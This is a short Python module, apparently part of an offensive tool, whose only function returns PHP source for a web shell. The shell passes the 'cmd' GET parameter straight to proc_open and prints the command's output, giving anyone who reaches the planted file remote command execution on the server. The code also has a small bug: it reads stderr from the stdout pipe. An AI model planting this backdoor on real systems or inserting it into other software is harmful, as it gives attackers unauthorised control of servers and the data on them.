"""This module contains all backdoor generation procedure.
"""


def generate_backdoor() -> str:
    """Generate some backdoor code.

    :returns str: The generated backdoor
    """
    return """<?php
$proc = proc_open($_GET['cmd'], [
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w'],
], $pipes);
$stdout = stream_get_contents($pipes[1]);
$stderr = stream_get_contents($pipes[1]);
fclose($pipes[2]);

echo $stdout;
echo $stderr;
"""
